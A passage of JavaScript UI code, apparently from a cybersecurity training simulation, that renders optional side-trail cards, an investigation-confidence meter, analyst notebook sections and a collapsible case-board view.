 * those two idempotent flags — no scoring, resources, or confidence touched. */
function maybeResolveSideTrail(trail) {
  if (!trail || sideTrailResolved(trail.id)) return;
  if (!sideTrailStepLocked(trail, 'observation') || !sideTrailStepLocked(trail, 'justification')) return;
  setMissionFlag('sideTrailResolved:' + trail.id, true);
  const reward = trail.reward || {};
  if (reward.board) setMissionFlag('sideTrailBoard:' + reward.board, true);
  if (SIM.sideTrailOpen) SIM.sideTrailOpen.add(trail.id);       // keep it expanded to show the result
  if (missionHasMap()) { updateMapButton(); if (SIM.mapOpen) renderSimMap(); }
}

/* ---- markup ---- */
function renderSideTrailsPanel() {
  const trails = visibleSideTrails();
  if (!trails.length) return '';
  const traced = trails.filter(t => sideTrailResolved(t.id)).length;
  return `
      <div class="sim-brief-divider"></div>
      <div class="sim-side-head">
        <span class="sim-brief-section-label">OPEN LEADS · OPTIONAL</span>
        <span class="sim-side-count">${traced}/${trails.length} traced</span>
      </div>
      <p class="sim-side-intro">Curiosity threads — entirely optional and never part of your case verdict. Trace one to pin a permanent node to the Case Board.</p>
      <div class="sim-side-list">${trails.map(sideTrailCardHtml).join('')}</div>`;
}

function sideTrailCardHtml(trail) {
  const resolved = sideTrailResolved(trail.id);
  const open = resolved || !!(SIM.sideTrailOpen && SIM.sideTrailOpen.has(trail.id));
  const meta = `${trail.tag ? `<span class="sim-side-tag">${mapEsc(trail.tag)}</span>` : ''}${trail.minutes ? `<span class="sim-side-min">${mapEsc(trail.minutes)}</span>` : ''}`;
  let html = `<div class="sim-side-card${resolved ? ' sim-side-card--resolved' : ''}${open ? ' is-open' : ''}">`;
  html += `<button type="button" class="sim-side-cardhead" data-sidetrail-open="${trail.id}" aria-expanded="${open ? 'true' : 'false'}">
      <span class="sim-side-glyph" aria-hidden="true">${resolved ? '▣' : '◌'}</span>
      <span class="sim-side-cardhead-main">
        <span class="sim-side-title">${mapEsc(trail.title || 'Open lead')}</span>
        <span class="sim-side-teaser">${mapEsc(trail.teaser || '')}</span>
      </span>
      <span class="sim-side-meta">${meta}</span>
    </button>`;
  if (open) {
    html += `<div class="sim-side-body">`;
    if (resolved) {
      html += `<div class="sim-side-resolved"><span class="sim-side-resolved-badge">LEAD TRACED</span>${mapEsc(trail.resolveNote || 'Lead resolved.')}</div>`;
      const bn = (trail.reward && trail.reward.boardNote) || 'A new relationship node is pinned to your Case Board — open the Network Map to see it.';
      html += `<div class="sim-side-board-note"><span aria-hidden="true">▣</span> ${mapEsc(bn)}</div>`;
    } else {
      if (Array.isArray(trail.artifacts) && trail.artifacts.length) {
        html += `<div class="sim-side-artifacts">${trail.artifacts.map(a => `
          <div class="sim-side-artifact">
            <div class="sim-side-artifact-label">${mapEsc(a.label || '')}</div>
            <pre class="sim-side-artifact-body">${(a.lines || []).map(mapEsc).join('\n')}</pre>
          </div>`).join('')}</div>`;
      }
      html += sideTrailStepHtml(trail, 'observation', 'WHAT STANDS OUT?');
      if (sideTrailStepLocked(trail, 'observation')) {
        html += sideTrailStepHtml(trail, 'justification', 'WHY DOES IT MATTER?');
      }
    }
    html += `</div>`;
  }
  html += `</div>`;
  return html;
}

function sideTrailStepHtml(trail, step, label) {
  const cfg = trail[step];
  if (!cfg || !Array.isArray(cfg.options)) return '';
  const pick = sideTrailJudg(trail.id)[step];
  const locked = !!pick && pick === cfg.correct;
  const opts = cfg.options.map(o => {
    if (locked) {
      if (o.id === cfg.correct) return `<div class="sim-side-opt sim-side-opt--locked sim-side-opt--correct">${mapEsc(o.label)}<span class="sim-side-mark">✓ traced</span></div>`;
      return `<div class="sim-side-opt sim-side-opt--locked sim-side-opt--muted">${mapEsc(o.label)}</div>`;
    }
    const isMiss = !!pick && pick === o.id;
    return `<button type="button" class="sim-side-opt${isMiss ? ' sim-side-opt--miss' : ''}" data-sidetrail-judgment data-trail="${trail.id}" data-step="${step}" data-option="${o.id}">${mapEsc(o.label)}</button>`;
  }).join('');
  let feedback = '';
  if (pick) {
    const chosen = cfg.options.find(o => o.id === pick);
    const correct = pick === cfg.correct;
    feedback = `<div class="sim-side-feedback sim-side-feedback--${correct ? 'correct' : 'wrong'}">
        <span class="sim-side-feedback-label">${mapEsc(trail.mentor || 'Field note')}</span>${mapEsc(chosen ? (chosen.feedback || '') : '')}${correct ? '' : ' <span class="sim-side-retry">Take another look.</span>'}</div>`;
  }
  return `
      <div class="sim-side-step sim-side-step--${step}${locked ? ' is-locked' : ''}">
        <div class="sim-side-step-label">${label}</div>
        <div class="sim-side-step-prompt">${mapEsc(cfg.prompt || '')}</div>
        <div class="sim-side-opts">${opts}</div>
        ${feedback}
      </div>`;
}

/* End-of-mission foreshadowing artifact (presentation-only) — rendered in the
 * debrief when def.foreshadow is set. Reads nothing mutable, persists nothing. */
function foreshadowCardHtml(fs) {
  if (!fs) return '';
  const lines = (fs.lines || []).map(l => `<div class="sim-foreshadow-line">${mapEsc(l)}</div>`).join('');
  return `
    <div class="sim-foreshadow">
      <div class="sim-foreshadow-stamp">${mapEsc(fs.kind || 'RECOVERED ARTIFACT')}</div>
      <div class="sim-foreshadow-title">${mapEsc(fs.title || '')}</div>
      <div class="sim-foreshadow-body">${lines}</div>
      ${fs.primes ? `<div class="sim-foreshadow-prime"><span aria-hidden="true">↗</span> ${mapEsc(fs.primes)}</div>` : ''}
    </div>`;
}

/* ------------------------------------------------------------------ *
 * Panel 2 — Evidence + file classification (INVESTIGATION engine, P2)
 * ------------------------------------------------------------------ */
/* Investigation confidence (0..100) — a presentation-only mirror of evidence
 * quality. Starts at 10 (you always know *something*) and climbs to 100 as the
 * weighted evidence is surfaced. Touches no scoring; the recommendation engine
 * still reads evidenceQuality()/classificationQuality() directly. */
function investigationConfidence() {
  const eq = evidenceQuality();
  const jq = judgmentQualityVisible();   // null unless this mission has surfaced graded challenges
  const base = (jq == null) ? eq : (0.75 * eq + 0.25 * jq);
  return Math.max(10, Math.min(100, Math.round(10 + 90 * base)));
}

/* The number shown on the meter. This is investigationConfidence() minus any
 * recoverable Risk Railguard dip (SIM.powers.confSpend) — a DISPLAY-ONLY offset.
 * investigationConfidence() itself, and every grading path that reads it, stay
 * untouched: the dip never reaches evidenceQuality/judgmentQuality/scoring. */
function displayInvestigationConfidence() {
  const base = investigationConfidence();
  const spend = (SIM.powers && SIM.powers.confSpend) || 0;
  return Math.max(10, base - spend);
}

/* Evidence breadth — how many distinct signal strengths (minor / notable / key)
 * the player has surfaced so far. Diegetic progress cue: reads SIM.evidence,
 * writes nothing, and never implies any judgment is right or wrong. 0..3. */
function evidenceBreadth() {
  const tiers = new Set();
  simEvidenceDefs().forEach(e => {
    if (!SIM.evidence.has(e.id)) return;
    tiers.add(e.qualityWeight >= 3 ? 'key' : e.qualityWeight === 2 ? 'notable' : 'minor');
  });
  return tiers.size;
}

function confidenceMeterHtml() {
  const c = displayInvestigationConfidence();
  const spend = (SIM.powers && SIM.powers.confSpend) || 0;
  const tone = c >= 70 ? 'good' : c >= 40 ? 'warn' : 'low';
  const note = spend > 0
    ? `\u2212${spend}% ${(SIM.powers && SIM.powers.confSpendSource === 'bet') ? 'staked on your call' : 'held for a calibration check'} \u00b7 recovers with your next sound judgment.`
    : 'Climbs as your commands uncover evidence.';
  const breadth = evidenceBreadth();
  const dots = [0, 1, 2]
    .map(i => `<span class="sim-breadth-dot${i < breadth ? ' sim-breadth-dot--on' : ''}"></span>`)
    .join('');
  return `
    <div class="sim-confidence sim-confidence--${tone}${spend > 0 ? ' sim-confidence--spent' : ''}">
      <div class="sim-confidence-head"><span>INVESTIGATION CONFIDENCE</span><span class="sim-confidence-pct"><span class="sim-confidence-nudge" aria-hidden="true">\u25B2</span>${c}%</span></div>
      <div class="sim-confidence-meter"><span class="sim-confidence-fill" style="width:${c}%"></span></div>
      <div class="sim-confidence-note">${note}</div>
      <div class="sim-confidence-breadth" role="img" aria-label="Evidence breadth: ${breadth} of 3 signal strengths gathered (minor, notable, key)">
        <span class="sim-confidence-breadth-label">EVIDENCE BREADTH</span>
        <span class="sim-breadth-dots" aria-hidden="true">${dots}</span>
      </div>
    </div>`;
}

/* A risk is "confirmed" once any evidence item that proves it has surfaced. */
function riskConfirmed(r) {
  return (r.triggeredBy || []).some(id => SIM.evidence.has(id));
}

function risksNotebookHtml() {
  const risks = (SIM.def && SIM.def.risks) || [];
  if (!risks.length) return '';
  const found = risks.filter(riskConfirmed).length;
  const items = risks.map(r => {
    const on = riskConfirmed(r);
    return `<li class="sim-risk${on ? ' sim-risk--on' : ''}"><span class="sim-risk-box" aria-hidden="true">${on ? '☑' : '☐'}</span><span>${r.label}</span></li>`;
  }).join('');
  return `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head sim-notebook-head--risks">POTENTIAL RISKS <span class="sim-notebook-count">${found}/${risks.length}</span></div>
      <ul class="sim-risks">${items}</ul>
    </div>`;
}

/* ANALYST NOTEBOOK — the four-part structure (FACTS / HYPOTHESES / UNKNOWNS /
 * RECOMMENDATIONS), all additive and data-gated on def.notebook. Each section
 * reacts to surfaced evidence the same way risks do:
 *   facts:[{label, confirmedBy:[evId]}]        → ✓ once any proving evidence hits
 *   hypotheses:[{label, triggeredBy:[evId]}]   → "SUPPORTED" once any evidence hits
 *   unknowns:[{label, resolvedBy:[evId]}]      → checked off as evidence resolves them
 *   recommendations:[{label, doneBy:[flag|evId]}] → checked as the action is recorded
 * Presentation-only (reads SIM.evidence + CAREER.missionFlags, mutates nothing);
 * absent def.notebook → renders nothing, and each section is optional. */
function notebookExtrasHtml() {
  const nb = (SIM.def && SIM.def.notebook) || null;
  if (!nb) return '';
  let html = '';

  // FACTS — verified findings, listed first so the player reads from what is known.
  const facts = Array.isArray(nb.facts) ? nb.facts : [];
  if (facts.length) {
    const confirmed = f => (f.confirmedBy || []).some(id => SIM.evidence.has(id));
    const count = facts.filter(confirmed).length;
    const items = facts.map(f => {
      const on = confirmed(f);
      return `<li class="sim-fact${on ? ' sim-fact--on' : ''}"><span class="sim-risk-box" aria-hidden="true">${on ? '✓' : '☐'}</span><span>${f.label}</span></li>`;
    }).join('');
    html += `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head sim-notebook-head--facts">FACTS <span class="sim-notebook-count">${count}/${facts.length} verified</span></div>
      <ul class="sim-facts">${items}</ul>
    </div>`;
  }

  const hyp = Array.isArray(nb.hypotheses) ? nb.hypotheses : [];
  if (hyp.length) {
    const supported = h => (h.triggeredBy || []).some(id => SIM.evidence.has(id));
    const count = hyp.filter(supported).length;
    const items = hyp.map(h => {
      const on = supported(h);
      return `<li class="sim-hyp${on ? ' sim-hyp--on' : ''}"><span class="sim-hyp-tag">${on ? 'SUPPORTED' : 'OPEN'}</span><span>${h.label}</span></li>`;
    }).join('');
    html += `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head sim-notebook-head--hyp">WORKING HYPOTHESES <span class="sim-notebook-count">${count}/${hyp.length}</span></div>
      <ul class="sim-hyps">${items}</ul>
    </div>`;
  }
  const unk = Array.isArray(nb.unknowns) ? nb.unknowns : [];
  if (unk.length) {
    const resolved = u => (u.resolvedBy || []).some(id => SIM.evidence.has(id));
    const open = unk.filter(u => !resolved(u)).length;
    const items = unk.map(u => {
      const on = resolved(u);
      return `<li class="sim-unknown${on ? ' sim-unknown--on' : ''}"><span class="sim-risk-box" aria-hidden="true">${on ? '☑' : '☐'}</span><span>${u.label}</span></li>`;
    }).join('');
    html += `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head sim-notebook-head--questions">OPEN QUESTIONS <span class="sim-notebook-count">${open} open</span></div>
      <ul class="sim-unknowns">${items}</ul>
    </div>`;
  }

  // RECOMMENDATIONS — actions worth taking, checked off as the matching decision
  // is recorded (a carry-flag is set) or its supporting evidence surfaces.
  const recs = Array.isArray(nb.recommendations) ? nb.recommendations : [];
  if (recs.length) {
    const flags = CAREER.missionFlags || {};
    const done = r => (r.doneBy || []).some(k => flags[k] || SIM.evidence.has(k));
    const onCount = recs.filter(done).length;
    const items = recs.map(r => {
      const on = done(r);
      return `<li class="sim-action${on ? ' sim-action--on' : ''}"><span class="sim-risk-box" aria-hidden="true">${on ? '☑' : '☐'}</span><span>${r.label}</span></li>`;
    }).join('');
    html += `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head sim-notebook-head--recs">RECOMMENDATIONS <span class="sim-notebook-count">${onCount}/${recs.length}</span></div>
      <ul class="sim-actions">${items}</ul>
    </div>`;
  }
  return html;
}

/* The single "what is this?" determination for command-model missions. Single
 * select; correctness is NOT shown live (no quiz feel) — it surfaces only in the
 * debrief's identification review and feeds the recommendation outcome there. */
function identifyNotebookHtml() {
  const idf = SIM.def && SIM.def.identify;
  if (!idf) return '';
  if (SIM.evidence.size === 0) return '';   // nothing to reason about yet
  const opts = (idf.options || []).map(o => {
    const on = SIM.identified === o.id;
    return `<button type="button" class="sim-identify-btn${on ? ' sim-identify-btn--on' : ''}" data-identify="${o.id}" aria-pressed="${on}">${o.label}</button>`;
  }).join('');
  const note = SIM.identified
    ? `<div class="sim-identify-note">${idf.note || 'Determination recorded — this feeds the strength of your recommendation.'}</div>`
    : '';
  return `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head sim-notebook-head--identify">${idf.head || 'YOUR DETERMINATION'}</div>
      <div class="sim-identify-prompt">${idf.prompt || ''}</div>
      <div class="sim-identify-opts">${opts}</div>
      ${note}
    </div>`;
}

/* Response checklist line: □ until a decision/recommendation is recorded, then
 * ☑ with the chosen action. Presentation-only mirror of SIM.decision. */
function responseStatusHtml() {
  const d = SIM.decision;
  let label = 'Recommend or take a response action';
  if (d) {
    let chosen = '';
    if (d.actionId) {
      const a = (SIM.def.actions || []).find(x => x.id === d.actionId);
      chosen = a ? a.label : d.actionId;
    } else if (d.recommendationId) {
      const rc = (SIM.def.recommendations || {})[d.recommendationId];
      chosen = rc ? rc.label : d.recommendationId;
    }
    label = chosen ? ('Response recorded — ' + chosen) : 'Response recorded';
  }
  const on = !!d;
  return `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head sim-notebook-head--response">RECOMMENDED RESPONSE</div>
      <ul class="sim-risks">
        <li class="sim-risk${on ? ' sim-risk--on' : ''}"><span class="sim-risk-box" aria-hidden="true">${on ? '☑' : '☐'}</span><span>${label}</span></li>
      </ul>
    </div>`;
}

/* ================================================================== *
 * ANALYST NOTEBOOK NAVIGATION CHROME (presentation-only)
 * ------------------------------------------------------------------ *
 * A thin, additive layer over the existing notebook render: a case-file
 * identity bar with Focus / Expand-all / Collapse-all tools, collapsible
 * sections with smart defaults, and uniform status tags. Every function
 * here touches ONLY transient SIM view-state (SIM.focusNotebook,
 * SIM.nbCollapsed) and the DOM — never scoring, persistence, or the
 * reducer. The collapse/focus toggles never call renderEvidencePanel(),
 * so the reading position is preserved. */

/* Sections collapsed by default (recap / optional / background). Everything
 * else — active or interactive — starts expanded so no required action is
 * ever hidden on first reveal. Keyed by section "kind". */
const NB_DEFAULT_COLLAPSED = { facts: 1, casefile: 1, hyp: 1, reflect: 1 };
/* Simplified first-day workspace (Mission 1): collapse the secondary
 * record-keeping sections by default — the "CASE HISTORY" (comms) log and the
 * "RECOMMENDED RESPONSE" status — so the notebook reads as one building case
 * board (Case Board + compact evidence + the active File Classification task),
 * not a stack of logs. Merged OVER NB_DEFAULT_COLLAPSED only when simpleUiMode()
 * is on (gated per-mission), so M2-M4 are byte-for-byte unchanged. */
const NB_SIMPLE_DEFAULT_COLLAPSED = { comms: 1, response: 1 };
const NB_SECTION_SEL = ':scope > .sim-notebook-section, :scope > .sim-feed, :scope > .sim-casefile, :scope > .sim-reflect';
const NB_HEAD_SEL = '.sim-notebook-head, .sim-feed-head, .sim-casefile-head, .sim-reflect-head';

/* Per-mission UI-complexity gate. Mission 1 sets def.uiComplexityLevel:'simple'
 * to opt into the decluttered first-day workspace (one building case-board card,
 * advanced modules hidden, consequence/feedback surfaces held back until a real
 * decision). Every other mission omits the flag and renders the full notebook
 * unchanged. Presentation-only — never affects scoring, persistence, curriculum,
 * or the no-spoiler invariant. */
function simpleUiMode() {
  return !!(SIM.def && SIM.def.uiComplexityLevel === 'simple');
}

/* Per-mission "review before the call" gate. When a mission sets
 * def.reviewBeforeCall, a freshly-surfaced graded call first shows a small
 * "read the file, then continue" beat in the Decision Dock (one CONTINUE button)
 * INSTEAD of dropping the full question card on top of the file the player just
 * printed. Once acknowledged, the exact same question card surfaces. Sequencing /
 * presentation only — never affects scoring, persistence, or the no-spoiler
 * invariant; gated per-mission, never on a mission id. */
function reviewGateMode() {
  return !!(SIM.def && SIM.def.reviewBeforeCall && SIM.def.caseFileNotebook);
}

/* Immersive case-file id derived from the active mission number (flavor only). */
function notebookCaseId() {
  try {
    const m = String(SIM.missionId || '').match(/(\d+)/);
    if (m) return 'CASE #' + m[1].padStart(4, '0');
  } catch (_) { /* flavor is best-effort */ }
  return '';
}

/* The notebook panel head: case-file identity + navigation tools. Re-emitted
 * on every render so the Focus button always mirrors SIM.focusNotebook; the
 * overlay class itself lives on #careerOps (which is never rebuilt). */
function notebookPanelHeadHtml(alert) {
  const focusOn = !!SIM.focusNotebook;
  const caseId = notebookCaseId();
  return `
    <div class="sim-panel-head sim-nb-panelhead">
      <span class="sim-nb-headline">
        <span class="sim-nb-title">ANALYST NOTEBOOK</span>
        ${caseId ? `<span class="sim-nb-caseid">${mapEsc(caseId)}</span>` : ''}
        ${alert || ''}
      </span>
      <span class="sim-nb-tools">
        <button type="button" class="sim-nb-tool" data-nb-expand-all title="Expand all sections" aria-label="Expand all sections"><span aria-hidden="true">⊕</span></button>
        <button type="button" class="sim-nb-tool" data-nb-collapse-all title="Collapse all sections" aria-label="Collapse all sections"><span aria-hidden="true">⊖</span></button>
        <button type="button" class="sim-nb-tool sim-nb-tool--focus${focusOn ? ' sim-nb-tool--on' : ''}" data-nb-focus aria-pressed="${focusOn}" title="${focusOn ? 'Exit focus mode' : 'Focus mode — expand the notebook'}">${focusOn ? '⤡ Exit' : '⤢ Focus'}</button>
      </span>
    </div>`;
}

/* Stable per-section key: the uniform head's --KIND suffix, the custom-section
 * class, else a positional fallback so two unkeyed blocks can't collide. */
function nbSectionKey(section, head, idx) {
  const m = (head.className || '').match(/sim-notebook-head--([a-z]+)/);
  if (m) return m[1];
  if (section.classList.contains('sim-feed')) return 'feed';
  if (section.classList.contains('sim-casefile')) return 'casefile';
  if (section.classList.contains('sim-reflect')) return 'reflect';
  return 'sec' + idx;
}

/* Conservative status tag derived only from existing DOM/state. Returns
 * {label, tone} or null (no chip). Never reveals correctness. */
function nbSectionStatus(key, section, grew) {
  const countEl = section.querySelector('.sim-notebook-count');
  const txt = countEl ? countEl.textContent.trim() : '';
  const ratio = txt.match(/(\d+)\s*\/\s*(\d+)/);
  const openM = txt.match(/(\d+)\s*open/i);
  switch (key) {
    case 'evidence': return grew ? { label: 'NEW', tone: 'new' } : { label: 'LIVE', tone: 'live' };
    case 'feed': return { label: 'LIVE', tone: 'live' };
    case 'comms':
      if (ratio) return (+ratio[1] < +ratio[2]) ? { label: 'ON COMMS', tone: 'active' }
                                                 : (+ratio[2] > 0 ? { label: 'IN SYNC', tone: 'done' } : null);
      return { label: 'ON COMMS', tone: 'active' };
    case 'obj':
      if (ratio) return (+ratio[1] >= +ratio[2] && +ratio[2] > 0) ? { label: 'COMPLETE', tone: 'done' }
                                                                   : { label: 'ACTIVE', tone: 'active' };
      return { label: 'ACTIVE', tone: 'active' };
    case 'questions':
      if (openM) return (+openM[1] > 0) ? { label: 'OPEN', tone: 'active' } : { label: 'RESOLVED', tone: 'done' };
      return null;
    case 'inv': return section.querySelector('.sim-inv-row--flag') ? { label: 'FLAGGED', tone: 'flag' } : { label: 'CLEAR', tone: 'done' };
    case 'identify': return (SIM.identified != null) ? { label: 'RECORDED', tone: 'done' } : { label: 'ACTION', tone: 'active' };
    case 'response': return (SIM.decision != null) ? { label: 'RECORDED', tone: 'done' } : { label: 'ACTION', tone: 'active' };
    case 'risks': return { label: 'WATCH', tone: 'flag' };
    case 'facts': return { label: 'LOGGED', tone: 'done' };
    case 'casefile': return { label: 'SUMMARY', tone: 'muted' };
    case 'bet': return { label: 'OPTIONAL', tone: 'muted' };
    case 'hyp': return { label: 'OPTIONAL', tone: 'muted' };
    case 'reflect': return { label: 'OPTIONAL', tone: 'muted' };
    default: return null;
  }
}

/* Post-render augmentation pass: turn each section head into a collapse toggle
 * and stamp a status tag. Runs after innerHTML is set (and BEFORE scroll
 * restoration, since collapsing changes layout). Idempotent per render — the
 * panel is rebuilt fresh each time, so heads are never double-decorated. */
function applyNotebookChrome(body, grew) {
  if (!body) return;
  const blocks = body.querySelectorAll(NB_SECTION_SEL);
  if (!SIM.nbCollapsed) SIM.nbCollapsed = {};
  // Simple mode collapses extra record-keeping sections by default (merged over
  // the global defaults). Gated on the per-mission flag, so other missions keep
  // the original default-collapse set untouched.
  const defaults = simpleUiMode()
    ? Object.assign({}, NB_DEFAULT_COLLAPSED, NB_SIMPLE_DEFAULT_COLLAPSED)
    : NB_DEFAULT_COLLAPSED;
  blocks.forEach((section, idx) => {
    const head = section.querySelector(NB_HEAD_SEL);
    if (!head || head.dataset.nbToggle) return;
    const key = nbSectionKey(section, head, idx);
    section.classList.add('sim-nb-section');
    head.classList.add('sim-nb-head');

    const collapsed = (key in SIM.nbCollapsed) ? !!SIM.nbCollapsed[key] : !!defaults[key];
    section.classList.toggle('sim-nb-collapsed', collapsed);

    head.setAttribute('role', 'button');
    head.setAttribute('tabindex', '0');
    head.setAttribute('aria-expanded', String(!collapsed));
    head.dataset.nbToggle = key;

    const status = nbSectionStatus(key, section, grew);
    if (status) {
      const chip = document.createElement('span');
      chip.className = 'sim-nb-status sim-nb-status--' + status.tone;
      chip.textContent = status.label;
      head.appendChild(chip);
    }
    const chev = document.createElement('span');
    chev.className = 'sim-nb-chevron';
    chev.setAttribute('aria-hidden', 'true');
    head.appendChild(chev);
  });
}

/* Collapse/expand a single section by toggling a DOM class — no re-render, so
 * the reading position never jumps. Persists into transient SIM.nbCollapsed. */
function toggleNotebookSection(head) {
  const section = head.closest('.sim-nb-section');
  if (!section) return;
  const collapsed = !section.classList.contains('sim-nb-collapsed');
  section.classList.toggle('sim-nb-collapsed', collapsed);
  head.setAttribute('aria-expanded', String(!collapsed));
  if (!SIM.nbCollapsed) SIM.nbCollapsed = {};
  if (head.dataset.nbToggle) SIM.nbCollapsed[head.dataset.nbToggle] = collapsed;
}

/* Expand-all / Collapse-all across the visible notebook. */
function setAllNotebookCollapsed(collapsed) {
  const body = document.querySelector('#simEvidence .sim-evidence-body');
  if (!body) return;
  if (!SIM.nbCollapsed) SIM.nbCollapsed = {};
  body.querySelectorAll('.sim-nb-section').forEach(section => {
    const head = section.querySelector('.sim-nb-head');
    section.classList.toggle('sim-nb-collapsed', collapsed);
    if (head) {
      head.setAttribute('aria-expanded', String(!collapsed));
      if (head.dataset.nbToggle) SIM.nbCollapsed[head.dataset.nbToggle] = collapsed;
    }
  });
}

/* Toggle the notebook focus/expand overlay (presentation-only). */
function setNotebookFocus(on) {
  SIM.focusNotebook = !!on;
  const ops = document.getElementById('careerOps');
  if (ops) ops.classList.toggle('career--nb-focus', SIM.focusNotebook);
  const btn = document.querySelector('#simEvidence [data-nb-focus]');
  if (btn) {
    btn.classList.toggle('sim-nb-tool--on', SIM.focusNotebook);
    btn.setAttribute('aria-pressed', String(SIM.focusNotebook));
    btn.innerHTML = SIM.focusNotebook ? '⤡ Exit' : '⤢ Focus';
    btn.title = SIM.focusNotebook ? 'Exit focus mode' : 'Focus mode — expand the notebook';
  }
}

/* Compact "case board" — the single focal card that replaces the dense notebook
 * stack in the simplified first-day workspace (simpleUiMode only). Summarises the
 * current finding, the open question Sarah is waiting on, and the next move. It is
 * a presentation-only derived view: reads newestEvidence / the visible discovery
 * challenges / caseFileNextStep / file state and writes NOTHING (no scoring, no
 * persistence, no spoilers). Rendered OUTSIDE the collapsible-section system
 * (.sim-caseboard is not matched by NB_SECTION_SEL) so it always stays open as
 * the building anchor of the right column. */
function caseBoardCardHtml() {
  const caseId = notebookCaseId();
  const latest = newestEvidence();
  const findingHtml = latest
    ? `<span class="sim-caseboard-val">${latest.label}</span>`
    : `<span class="sim-caseboard-val sim-caseboard-val--muted">Nothing yet — open the files in the terminal to start your review.</span>`;

  // The open question Sarah is waiting on (mirrors caseFileNextStep's priority):
  // an un-recorded observation first, then a missing justification. The actual
  // answer UI is the Decision Dock — this card only points the analyst to it.
  const vis = visibleDiscoveryChallenges().filter(challengeValid);
  const pendingObs = vis.find(c => !stepAnswered(c, 'observation'));
  const pendingJust = vis.find(c => stepAnswered(c, 'observation') && !stepAnswered(c, 'justification'));
  let askHtml = '';
  if (pendingObs) {
    askHtml = `Sarah wants your read on "${pendingObs.short || 'this finding'}" — answer in the Decision Dock below.`;
  } else if (pendingJust) {
    askHtml = `Sarah is asking why "${pendingJust.short || 'this finding'}" matters — tell her in the Decision Dock.`;
  }

  const next = caseFileNextStep();

  // Orientation readout (findings logged + files cleared from the release) — never a score.
  const files = simFiles();
  const classified = files.filter(f => SIM.classified[f.name]).length;
  const bits = [`${SIM.evidence.size} finding${SIM.evidence.size === 1 ? '' : 's'}`];
  if (files.length) bits.push(`${classified}/${files.length} files classified`);

  return `
    <div class="sim-caseboard" role="status" aria-live="polite">
      <div class="sim-caseboard-head">
        <span class="sim-caseboard-title">CASE BOARD</span>
        ${caseId ? `<span class="sim-caseboard-caseid">${mapEsc(caseId)}</span>` : ''}
      </div>
      <div class="sim-caseboard-row">
        <span class="sim-caseboard-tag">Current finding</span>
        ${findingHtml}
      </div>
      ${askHtml ? `<div class="sim-caseboard-row sim-caseboard-row--ask">
        <span class="sim-caseboard-tag sim-caseboard-tag--ask">Sarah's asking</span>
        <span class="sim-caseboard-val">${askHtml}</span>
      </div>` : ''}
      ${next ? `<div class="sim-caseboard-row sim-caseboard-row--next">
        <span class="sim-caseboard-tag">Next move</span>
        <span class="sim-caseboard-val">${next}</span>
      </div>` : ''}
      <div class="sim-caseboard-status">${bits.join(' · ')}</div>
    </div>`;
}

function renderEvidencePanel() {
  renderStageBar();   // Workflow stage indicator (Task #154) — keep in sync on every state change.
  const host = document.getElementById('simEvidence');
  if (!host) return;

  const mode = evidenceView();

  // Global Beginner / Analyst view toggle (Beginner is the default).
  const viewbar = `
    <div class="sim-ev-viewbar">
      <span class="sim-ev-viewbar-label">EVIDENCE VIEW</span>
      <div class="sim-ev-viewtoggle" role="group" aria-label="Evidence view mode">
        <button type="button" class="sim-ev-viewbtn${mode === 'beginner' ? ' sim-ev-viewbtn--on' : ''}" data-ev-view="beginner" aria-pressed="${mode === 'beginner'}">Beginner</button>
        <button type="button" class="sim-ev-viewbtn${mode === 'analyst' ? ' sim-ev-viewbtn--on' : ''}" data-ev-view="analyst" aria-pressed="${mode === 'analyst'}">Analyst</button>
      </div>
    </div>`;

  const evItems = simEvidenceDefs()
    .filter(e => SIM.evidence.has(e.id))
    .map(e => renderEvItem(e, mode))
    .join('');
  const emptyMsg = (SIM.def && SIM.def.evidenceEmpty) ||
    'No evidence yet. Use the terminal to investigate — each command can surface new findings.';
  const evSection = `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head sim-notebook-head--evidence">EVIDENCE COLLECTED <span class="sim-notebook-count">${SIM.evidence.size}</span></div>
      ${evItems || `<p class="sim-empty">${emptyMsg}</p>`}
    </div>`;

  // "What concerns you?" reasoning step — appears once the suspicious activity
  // it belongs to has been surfaced. Reasoning practice, never graded.
  const reflectEv = activeReflectionEv();
  const reflectHtml = reflectEv ? reflectionCardHtml(reflectEv) : '';

  const classHtml = renderClassifyHtml(mode);    // M1 file flow ('' for command-model)
  const identifyHtml = identifyNotebookHtml();    // command-model ('' for M1)
  const risksHtml = risksNotebookHtml();
  const extrasHtml = notebookExtrasHtml();
  const responseHtml = responseStatusHtml();

  // Investigation-First pilot (Mission 1): a case-file notebook with graded
  // discovery cards. Strictly gated on the dataset flag — every other mission
  // falls through to the original notebook below, byte-for-byte unchanged.
  if (SIM.def && SIM.def.caseFileNotebook) {
    // Attention loop: detect what changed since the last render so the panel can
    // pull the player's eye to it (presentation-only — reads state, writes only
    // transient view trackers).
    const evCount = SIM.evidence.size;
    const grew = evCount > (SIM.nbEvidenceCount || 0);
    SIM.nbEvidenceCount = evCount;
    const conf = investigationConfidence();
    const confChanged = SIM.nbConfidence != null && conf !== SIM.nbConfidence;
    const confRose = SIM.nbConfidence != null && conf > SIM.nbConfidence;
    SIM.nbConfidence = conf;
    const pending = visibleDiscoveryChallenges()
      .filter(c => challengeValid(c) && !challengeAnswered(c)).length;
    const alert = pending > 0
      ? `<span class="sim-nb-alert">${pending} awaiting in dock</span>` : '';
    // Preserve the player's reading position across the full innerHTML rebuild.
    // The notebook re-renders on every submit; without capturing/restoring the
    // scroll container's offset, the freshly-built .sim-evidence-body starts at
    // top and the panel snaps to the top each time a comms reply is logged. When
    // evidence GREW we deliberately scroll to the newest finding instead.
    const prevBody = host.querySelector('.sim-evidence-body');
    const prevScroll = prevBody ? prevBody.scrollTop : 0;
    // Simplified first-day workspace (Mission 1, gated on def.uiComplexityLevel):
    // one building Case Board card + the essential surfaces, with the advanced
    // analyst modules hidden and record-keeping collapsed. Omitting a section is
    // safe — every helper here is a presentation-only state reader, so not calling
    // it changes nothing in scoring/persistence. The else branch is the ORIGINAL
    // template reproduced verbatim so M2-M4 (no flag) render byte-for-byte
    // identical — never funnel both through a shared interpolation.
    const simpleUi = simpleUiMode();
    if (simpleUi) {
      host.innerHTML = `
      ${notebookPanelHeadHtml(alert)}
      <div class="sim-evidence-body sim-evidence-body--simple">
        ${caseBoardCardHtml()}
        ${evSection}
